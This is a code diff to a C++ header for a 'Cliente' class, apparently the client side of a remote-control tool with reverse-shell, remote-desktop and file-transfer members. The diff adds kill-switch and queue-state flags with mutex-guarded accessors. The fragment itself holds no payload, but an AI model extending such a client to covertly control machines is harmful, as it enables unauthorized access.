@@ -18,6 +18,7 @@ class Cliente {
 		std::mutex mtx_shell;
 		std::mutex mtx_running;
 		std::mutex mtx_queue;
+		std::mutex mtx_kill;
 
 		std::thread p_thQueue;
 
@@ -34,10 +35,17 @@ class Cliente {
 		mod_RemoteDesktop* mod_RemoteDesk = nullptr;
 
 		//Para recibir archivo (single)
+		std::ofstream ssArchivo;
 		FILE *fpArchivo = nullptr;
 
 		//Queue para comandos recibidos
 		std::queue<std::vector<char>> queue_Comandos;
+
+		bool isRunning = true;
+		bool isQueueRunning = true;
+		bool isShellRunning = false;
+		bool BLOCK_MODE = false;
+		bool isKillSwitch = false;
 		
 	public:
 		SOCKET sckSocket = INVALID_SOCKET;
@@ -89,10 +97,6 @@ class Cliente {
 		Cliente();
 		~Cliente();
 		
-		bool isRunning = true;
-		bool isShellRunning = false;
-		bool BLOCK_MODE = false;
-
 		//Misc
 		std::string ObtenerDesk();
 		std::string ObtenerDown();
@@ -117,6 +121,7 @@ class Cliente {
 		void Spawn_QueueMan();
 		void Procesar_Comando(std::vector<char>& cBuffer);
 		void DestroyClasses();
+
 		bool m_isRunning() {
 			std::unique_lock<std::mutex> lock(mtx_running);
 			return isRunning;
@@ -127,14 +132,15 @@ class Cliente {
 			isRunning = false;
 		}
 
-		void charFree(char*& nBuffer, int pLen) {
-			if (nBuffer) {
-				ZeroMemory(nBuffer, pLen);
-				delete[] nBuffer;
-				nBuffer = nullptr;
-			}
+		bool m_isQueueRunning() {
+			std::unique_lock<std::mutex> lock(mtx_queue);
+			return isQueueRunning;
 		}
 
+		void m_StopQueue() {
+			std::unique_lock<std::mutex> lock(mtx_queue);
+			isQueueRunning = false;
+		}
 };
 
 class ReverseShell {
